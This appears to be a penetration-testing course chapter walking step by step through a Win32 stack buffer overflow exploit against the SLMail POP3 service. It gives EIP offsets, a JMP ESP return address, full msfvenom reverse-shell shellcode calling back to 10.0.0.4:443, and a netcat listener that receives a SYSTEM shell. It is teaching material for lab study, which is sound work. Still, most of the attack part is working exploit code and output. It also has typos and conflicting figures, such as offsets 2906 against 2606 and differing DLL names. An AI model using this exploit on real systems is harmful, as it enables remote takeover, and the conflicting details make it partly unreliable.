# 7. - Win32 Buffer Overflow Exploitation

##### p. 138

## 7.1 - Replicating the Crash

From our fuzzer output, we can deduce that SLMail has a buffer overflow vulnerability when a **PASS** command with a password containing about 2700 bytes is sent to it. Our first task in the exploitation process is to write a simple script that will replicate our observed crash, without having to run the fuzzer each time. Our script would look similar to the following.

##### [fuzzer.py]()

## 7.2 - Controlling EIP

Getting control of the EIP register is a crucial step of exploit development. The EIP register is like the reins on a running horse. Pulling the reins left will make the application go one way, while pulling then right will make it go the other. For this reason, it i vital that we locate those 4 *A*'s that overwrite our EIP register in the buffer. The are two common ways to do this:

### 7.2.1 - Binary Tree Analysis

Instead of 2700 *A*'s, we send 1350 *A*'s and 1350 *B*'s. If EIP is overwritten by *B*'s, we know the four bytes reside in the second half of the buffer. We then chande the 1350 *B*'s to 675 *B*'s and 675 *C*'s, and send the buffer again. If EIP is overwritten by *C*'s, we know that the four bytes reside in the 2000-2700 byte range. We continue splitting the specific buffer until we reach the exact four bytes that overwrite EIP.

### 7.2.2. - Sending a Unique String

The faster method of identifying these four bytes is to send a unique string of 2700 bytes, identify the 4 bytes that overwrite EIP, and then locate those four bytes in our unique buffer.

#### **Pattern Create**

The **pattern_create.rb** is a Ruby tool for creating and locating such buffers, and can be found as part of the Metasploit Framework exploit development scripts.

```
root@kali:~# locate pattern_create
/usr/share/metasploit-framework/tools/pattern_create.rb
root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 2700
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3A	
...
```

Plugging this buffer insted of our 2700 *A*'s into our Python exploit produces an EIP overwrite that looks similar to the following image. Note both the  **ESP** and **EIP** register values in this next crash.

![ EIP  Overwritten  by  the  Unique  Pattern](https://image.ibb.co/cYS5C7/01.png)

The EIP register has been overwritten with the hex bytes **39 69 44 38** (equivalent to the string **8Dj9**). We can now use the companion to **pattern_create**, **pattern_offset.rb**, to discover the offset of these specific 4 bytes in our unique byte string.

```
root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 39694438
[*] Exact match at offset 2906
```

The **pattern_offset.rb** script reports these 4 bytes being located at offset 2606 of the 2700 bytes. Let's translate this to a new modified buffer string, and see if we can control the EIP register. We modify our exploit to contain the following buffer string.

Sending this new buffer to the SLMail POP3 server produces the following crash in our debugger.

* **ESP**: 024FA128
* **EIP**: 42424242

This time, the ESP has a different value than our first crash. The EIP register is cleanly overwritten by *B*'s (**\x42**), signifying that our calculation were correct, and we can now control the execution flow of the SLMail application. Where, exactly, do we redirect the execution flw, now that we control the EIP register?

Part of our buffer can contain the code (or **shellcode**) we would like to have executed by the SLmail application, such as a reverse shell. Our next steps will involve examining and prepating the space for this shellcode, and figuring out a way to redirect code execution to it.

### 7.2.3 - Exercicies

1. Write a standalone script to replicate the crash

> [scripts](https://github.com/cdojo/OSCP/tree/master/07-Win32%20Buffer%20Overflow%20Exploitation/scripts)

2. Determine the offset of EIP for the data that is being sent.

> ...

3. Update your standalone script to place a unique value into EIP, to ensure your offsets are corrent.

> ...

## 7.3 - Locating Space for Your Shellcode

The Metasploit Framework can automatically generate shellcode payloads. A standard reverse shell payload requires about 350-400 bytes of space. Looking back at the last crash, we can see that the ESP register points directly to the beginning of our buffer of *C*'s. This seems like a convenient location to place our shellcode as it will be easily accessible to us through the ESP register later on.

![ESP is Pointing to the Buffer of CÊ¹s](https://image.ibb.co/gMLLen/02.png)

However, on counting those *C*'s, we notice that we have a total of **74** of them - not enough to contain a 350-byte payload. One easy way out of this is simply to try to increase our buffer length from 2700 bytes to 3500 bytes, and see if this results in a larger space for our shellcode.

```python
buffer = "A" * 2606 + "B" * 4 + "C" * (3500 - 2606 - 4)
```

Once the new, longer buffer is sent, we see the following in the debugger.

![Our Increased Buffer Length is Successful](https://preview.ibb.co/kdzDX7/03.png)

This simple trick has provided us with significantly more space to work with. Upon further examination, we see that a total of 424 bytes of free space are available to us to use for shellcode. Once again, notice how the address in ESP points to our buffer, and also take note that this address is not the same as the address from the previous crashes.

## 7.4 - Checking for Bad Characters

Depending on the application, vulnerability type, and protocols in use, there may be certain characters that are considered "bad" and should not be used in your buffer, or shellcode. One example of a common bad charecter is the **null byte** (**0x00**).

This character is considered bad because a null byte is also used to terminate a string copy operation, wich would effectively truncate our buffer to wherever the first null byte appears.

Another example of a bad character, specific to the POP3 PASS command, is the carriage return (**0x0D**), wich signifies to the application that the end of the password has been reachead.

An experienced exploit writer knows to check for bad chaacters, to prevent future problems. An easy way to do this is to send all possible characters, from **0x00** to **0xff**, as part of our buffer, and see how these characters are dealt with by the application, after the crash occurs.

##### Bad chars

```python
badchars = "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18"
badchars += "\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31"
badchars += "\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a"
badchars += "\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63"
badchars += "\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c"
badchars += "\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95"
badchars += "\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae"
badchars += "\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7"
badchars += "\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
badchars += "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9"
badchars += "\xfa\xfb\xfc\xfd\xfe\xff"
```

The resulting memory dump for the ESP register shows that the character **0x0A** seems to have truncated the rest of the buffer that comes after it.

![The Buffer is Truncated](https://image.ibb.co/dgDnQS/04.png)

This is not surprising, once we identify that the **0x0A** character is a Line Feed, which is a bad character, in the case, for the same reasons that a Carriage Return is bad. We remove the **\x0A** character from our list, and resend the payload. Looking at the resulting buffer, in memory, we see the following uotput, in the debugger.

![Our Buffer is Still Corrupted](https://ibb.co/g6eaen)

The only other problem we see occurs between **0x0C** and **0x0E**, which means that the character **0x0D** is the culprit, but we should have alredy anticipated this. All the others characters seem to have no issues with SLMail, and do not get truncated, or mangled.

To summarize, our buffer should not include in any may the following characters: **0x00**, **0x0A**, **0x0D**.

##### [bad_chars.py](#)

### 7.4.1 Exercicies

1. Identify the bad characters that cannot be included in the payload.

> [bad_chars.py]()

2. Understand why these characters are not allowed. What does the hex translate to in ASCII?

> ...

## 7.5 - Redirecting the Execution Flow

Now comes the interesting bit. We've placed our shellcode in a memory space that is easily accessible through the ESP register, and we control the EIP register. We also figured out which characters are allowed to be in our buffer, and which are not. Our next task is finding a way to redirect the execution flow to the shellcode located at the memory address that the ESP register is pointing to, at crash time.

The most intuitive thing to do would be to try replacing the B's that overwrite EIP with the address that pops up in the ESP register, at the time of the crash. However, as you should have noticed from the past few debugger restarts, the value od ESP changes, from crash to crash. Therefore, hardcoding a specific stack address would not provide a reliable way of getting to our buffer. This is because stack address change often, especially in threaded applications such as SLMail, as each thread has its reserved stack memory region allocated by the operating system.

### 7.5.1 - Finding a Return Address

If we can't jump directly to our buffer, what other options do we have? We beed a more generic way to get to the address ESP points to, at the time of the crash. If we can find an accessible, reliable address in memory that contains an instruction sucj as **JMP ESP**, we could jump to it, and in turn end up at the address pointed to, by the ESP register, at the time of the jump. This would provide a reliable, indirect way to reach the memory indicated by the ESP register, regardless of its absolute value. but how do we find such an address? To our aid comes the Immunuty Debugger script, **mona.py**. This script will help us identify modules in memory that we can search for such a "**return address**", which in our case is a JMP ESP command. We will need to make sure to choose a module with the following criteria:

1. No memory protections such as DEP and ASLR present.
2. has a memory range that does not contain bad characters.

Looking at the output of the **!mona modules** command within Immunity Debugger shows the following output.

![The Output of the !mona modules Command](https://preview.ibb.co/m3BkC7/image.png)

The **mona.py** script has identified the **SMLCF.DLL** as not beign affected by any memory protection schemes, as well as not beign rebased on each reboot. This means tha this DLL will always reliably load to the same address. now, we need to find a naturally occuring JMP ESP (or equivalent) instruction within whis DLL, and identify at what address this instruction is located. Let's take a close look at the memory mapping of this DLL.

![Inspecting the DLL Memory Mapping](https://image.ibb.co/gibc9n/image.png)

If this application were compiled with DEP support, our JMP ESP address would have to be located in the code (**.text**) segment of the module, as that is the only segment with both Read (R) and Executable (E) permissions. However, since no DEP is enabled, we are free to use instructions from any address in this module. As searching for a JMP ESP address from within Immunity Debugger will only display address from the code section, we will need to run a more exhaustive binary search for a JMP ESP, or equivalent, opcode. To find the opcode equivalent to JMP ESP, we can use the Metasploit NASM Shell ruby script:

```
root@kali:~# /usr/share/metasploit-framework/tools/nasm_shell.rb
nasm > jmp esp
00000000  FFE4				jmp esp
nasm >
```

Now that we know what we are looking for, we can search for this opcode in all the sections of the **slmfc.dll** file using the Mona script:

> !mona find -s "\xff\xe4" -m slmfc.dll

![Searching for a JMP ESP Instruction](https://preview.ibb.co/kuFhaS/image.png)

Several possible addresses are found containing a JMP ESP instruction. We choose one which does not contain any bad characters, such as **0x5f4a358f**, and double-check the contents of this address, inside the debugger.

![Verifying the JMP ESP Address](https://image.ibb.co/nJJDh7/image.png)

Perfect! Address **0x5f4a358f** in SLMFV.dll contains a **JMP ESP** instruction. If we redirect EIP to this address at the time of the crash, a JMP ESP instruction will be executed, which will lead the execution flw into our shellcode.

We can test this assumption by modifyng our payload string to look similar to the following line, and place a memory breakpoint at the address **0x5f4a358f**, before again running our script in the debugger.

```python
return "A" * 2606 +	"\x8f\x35\x4a\x5f" + "C" * 390
```

The return address is written the wrong way around, as the **x86** architecture stores addresses in little [endian format](https://en.wikipedia.org/wiki/Endianness), where the low-order byte of the number is stored in memory at the lowest address, and the high-order byte at the highest address. Using F2, we place a breakpoint on the return address, and run our exploit again, and we see output similar to the following.

![The JMP ESP Breakpoint is Reached](https://preview.ibb.co/dACiPn/image.png)

Notice how our **JMP ESP** was reached, and since we had a breakpoint present, the debugger has paused, and informed us about the breakpoint present, the debugger has paused, and informed us about the breakpoint beign hit. Pressing **F7** in the debugger will single step us into the shellcode, which is currently just a bunch of **C's**.

### 7.5.2 - Exercicies

1. identify a **JMP ESP** that is usable in the exploit.

> ...

2. update your PoC to include the discovered **JMP ESP**, set a break point on it, and follow the execution.

> ...

## 7.6 - Generating Shellcode with Metasploit

Writing our own shellcode from scratch is beyond the scope of this course, however the [Metasploit Framework](https://www.metasploit.com/) provides s with tols and utilities which make generating complex payload a simple task. The **msfvenom** command can autogenerate over 275 shellcode payload options.

```
root@kali:~# msfvenom -l
```

áºe will use a basic payload called **windows/shell_reverse_tcp**, which acts much like a reverse shell **netcat** paylaod. The payload requires at least an **LHOST** parameter, which defines the IP to send back the reerse shell. An **LPORT** parameter specifying that the connect back port may also be defined. The **msfvenom** script will generate C formatted (**-f C** parameter) shellcode using the following command:

```
root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of c file: 1386 bytes
unsigned char buf[] = 
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x00\x02\x0f\x68"
"\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
"\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2"
"\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44"
"\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56"
"\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff"
"\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";
```

that was easy enough, however we can immediately identify bad characters in this shellcode, such as null bytes. We will need to encode this shellcode using the Metasploit Framewrok (**-b** parameter).

```
root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -b "\x00\x0a\x0d" -f c
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
"\xd9\xcc\xbb\xc7\xd6\x24\xeb\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x83\xea\xfc\x31\x5a\x13\x03\x9d\xc5\xc6\x1e\xdd\x02\x84"
"\xe1\x1d\xd3\xe9\x68\xf8\xe2\x29\x0e\x89\x55\x9a\x44\xdf\x59"
"\x51\x08\xcb\xea\x17\x85\xfc\x5b\x9d\xf3\x33\x5b\x8e\xc0\x52"
"\xdf\xcd\x14\xb4\xde\x1d\x69\xb5\x27\x43\x80\xe7\xf0\x0f\x37"
"\x17\x74\x45\x84\x9c\xc6\x4b\x8c\x41\x9e\x6a\xbd\xd4\x94\x34"
"\x1d\xd7\x79\x4d\x14\xcf\x9e\x68\xee\x64\x54\x06\xf1\xac\xa4"
"\xe7\x5e\x91\x08\x1a\x9e\xd6\xaf\xc5\xd5\x2e\xcc\x78\xee\xf5"
"\xae\xa6\x7b\xed\x09\x2c\xdb\xc9\xa8\xe1\xba\x9a\xa7\x4e\xc8"
"\xc4\xab\x51\x1d\x7f\xd7\xda\xa0\xaf\x51\x98\x86\x6b\x39\x7a"
"\xa6\x2a\xe7\x2d\xd7\x2c\x48\x91\x7d\x27\x65\xc6\x0f\x6a\xe2"
"\x2b\x22\x94\xf2\x23\x35\xe7\xc0\xec\xed\x6f\x69\x64\x28\x68"
"\x8e\x5f\x8c\xe6\x71\x60\xed\x2f\xb6\x34\xbd\x47\x1f\x35\x56"
"\x97\xa0\xe0\xf9\xc7\x0e\x5b\xba\xb7\xee\x0b\x52\xdd\xe0\x74"
"\x42\xde\x2a\x1d\xe9\x25\xbd\x28\xee\x27\x32\x45\xec\x27\x4d"
"\x2e\x79\xc1\x27\x40\x2c\x5a\xd0\xf9\x75\x10\x41\x05\xa0\x5d"
"\x41\x8d\x47\xa2\x0c\x66\x2d\xb0\xf9\x86\x78\xea\xac\x99\x56"
"\x82\x33\x0b\x3d\x52\x3d\x30\xea\x05\x6a\x86\xe3\xc3\x86\xb1"
"\x5d\xf1\x5a\x27\xa5\xb1\x80\x94\x28\x38\x44\xa0\x0e\x2a\x90"
"\x29\x0b\x1e\x4c\x7c\xc5\xc8\x2a\xd6\xa7\xa2\xe4\x85\x61\x22"
"\x70\xe6\xb1\x34\x7d\x23\x44\xd8\xcc\x9a\x11\xe7\xe1\x4a\x96"
"\x90\x1f\xeb\x59\x4b\xa4\x1b\x10\xd1\x8d\xb3\xfd\x80\x8f\xd9"
"\xfd\x7f\xd3\xe7\x7d\x75\xac\x13\x9d\xfc\xa9\x58\x19\xed\xc3"
"\xf1\xcc\x11\x77\xf1\xc4";
```

The resulting shellcode will send a reverse shell to **10.0.0.4** on port **443**, contains no bad characters, and is 341 bytes long.

## 7.7 - Getting a Shell

Getting a reverse shell from SLMail should be as simple as replacing our buffer of **C's** with the shellcode, and sending off our exploit over the network. However, since the ESP register points to the beginning of our payload, the Metasploit Framework decoder will step on its toes, by overwriting the first few bytes of our shellcode, rendering it useless. We can avoid this issue by adding few **No Operation (NOP)** instructions (**0x90**) at the beginning of our shellcode. As the name suggests, this instructions does nothing it simply moves on to the next instruction to be executed.

Our final exploit would look similar to the folowing.

##### [shellcode.py](#)

In anticipation of the reverse shell payload, we set up a netcat listener on port 443 of our attacking machine.

```
root@kali:~# nc -vnlp 443
```

We send our exploit.

```
root@kali:~# python exploit.py
Sending evil buffer...
```

And we should hopefully recieve a SYSTEM reverse shell from our victim machine.

```
root@kali:~# nc -vnlp 443
listening on [any] 443...
connect to [10.0.0.4] from (UNKNOWN) [10.0.0.22] 49557
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Program Files\SLmail\System> whoami
whoami
nt authority\system
```

Once we exit the reverse shell, the SLMail POP3 service crashes and exits.

### 7.7.1 - Exercises

1. Update your Poc to include a working payload.

> ...

2. obtain a shell from SLmail.

> ...

## 7.8 - Improving the Exploit

When using default Metasploit Framework shellcode, the default exit method the shellcode uses, at the end of shellcode execution, is the **ExitProcess**. This exit method wull shut down the whole mail service process, effectively killing the SLMail service, and causing it to crash.

It the program we are exploiting is a threaded application (which it is, in this instance), we can tru to avoid crashing the service completely, by using an Exit Thread method instead, which will just terminate the affected thread of the program. This will make our exploit work without interrupting the usual operations of the POP3 server, as well as allow us to repeatedly exploit the server, and exit the shell without briging down the service. To instruct **msfvenom** to use the **ExitThread** method during the shellcode generation, we can issue the following command:

> EXITFUNC=thread

```
root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 EXITFUNC=thread LPORT=443 -b "\x00\x0a\x0d" -f c
```

Try generating the above shellcode and replacing it with your existing shellcode.

### 7.8.1

1. Update the exploit so that SLmail still runs after exploitation.

> ...